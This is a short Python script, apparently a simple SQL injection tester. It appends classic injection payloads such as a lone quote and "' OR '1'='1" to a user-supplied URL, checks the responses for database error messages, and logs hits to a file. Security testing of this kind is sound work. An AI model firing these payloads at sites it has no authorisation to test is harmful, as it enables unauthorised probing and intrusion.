import requests
import datetime

def check_sqli(url):
    print(f"\nTesting {url} for possible SQL Injection...\n")
    
    payloads = [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1'
    ]

    # Common database error keywords
    errors = [
        "SQL syntax",
        "mysql_",
        "Unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html"
    }

    vulnerable = False

    for payload in payloads:
        target_url = f"{url}{payload}"
        print(f"Trying payload: {payload}")

        try:
            response = requests.get(target_url, headers=headers, timeout=5)

            for error in errors:
                if error.lower() in response.text.lower():
                    print("\nPossible SQL Injection vulnerability detected!")
                    print(f"Payload used: {payload}")
                    print(f"URL: {target_url}")

                    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                    with open("scan_results.txt", "a") as f:
                        f.write(f"{current_time} - Possible SQLi at {target_url} | Payload: {payload}\n")

                    vulnerable = True
                    break

        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

        if vulnerable:
            break

    if not vulnerable:
        print("\nNo obvious SQL errors detected.")


if __name__ == "__main__":
    print("Simple SQL Injection Tester")
    print("Make sure the URL ends with a parameter value.\n")

    target = input("Enter target URL: ").strip()

    if target:
        check_sqli(target)
    else:
        print("No URL entered.")
